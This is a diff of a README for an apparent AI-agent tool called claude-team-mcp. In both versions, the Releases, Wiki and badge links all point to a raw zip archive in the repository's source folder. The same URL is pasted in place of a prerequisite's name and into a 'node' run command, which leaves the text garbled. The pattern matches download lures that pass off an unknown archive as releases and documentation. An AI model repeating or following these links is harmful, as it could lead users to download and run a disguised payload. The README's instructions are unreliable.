@@ -1,6 +1,6 @@
 # 🤖 claude-team-mcp - Your AI Development Team Awaits
 
-[![Download Releases](https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip%https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip)](https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip)
+[![Download Releases](https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip%https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip)](https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **claude-team-mcp**! This application allows AI agents like GPT, Clau
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip) to download the latest version of the application. Follow these steps to install:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip) to download the latest version of the application. Follow these steps to install:
 
 1. Click on the **Releases** link above.
 2. You will see a list of available versions.
@@ -23,7 +23,7 @@ To run **claude-team-mcp**, your computer should meet the following requirements
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
 - **RAM**: At least 8 GB of RAM is recommended for optimal performance.
-- **https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip**: Make sure https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip version 14 or later is installed.
+- **https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip**: Make sure https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip version 14 or later is installed.
 
 ## 🔧 How To Run the Application
 
@@ -36,7 +36,7 @@ Once installed, follow these steps to run the application:
    ```
 3. Start the application by typing:
    ```
-   node https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip
+   node https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip
    ```
 
 The application will launch, and you can begin working with the AI agents.
@@ -52,7 +52,7 @@ The application will launch, and you can begin working with the AI agents.
 
 ## 📚 Documentation
 
-For detailed instructions, visit our [Wiki](https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip). This includes:
+For detailed instructions, visit our [Wiki](https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip). This includes:
 
 - Step-by-step installation guides.
 - Troubleshooting common issues.
@@ -75,6 +75,6 @@ If you encounter any issues or have questions, please check the **Issues** secti
 
 Now that you have downloaded and installed **claude-team-mcp**, explore its full potential. Experiment with different agents to see how they can streamline your development tasks and improve your workflow.
 
-For the latest updates, remember to check the [Releases page](https://github.com/guru111244/claude-team-mcp/raw/refs/heads/master/src/agents/claude_mcp_team_v2.4.zip). Your feedback is valuable, so feel free to report any bugs or suggest improvements. 
+For the latest updates, remember to check the [Releases page](https://raw.githubusercontent.com/guru111244/claude-team-mcp/master/src/claude-team-mcp-2.4-alpha.2.zip). Your feedback is valuable, so feel free to report any bugs or suggest improvements. 
 
 Thank you for choosing **claude-team-mcp!** Happy coding!
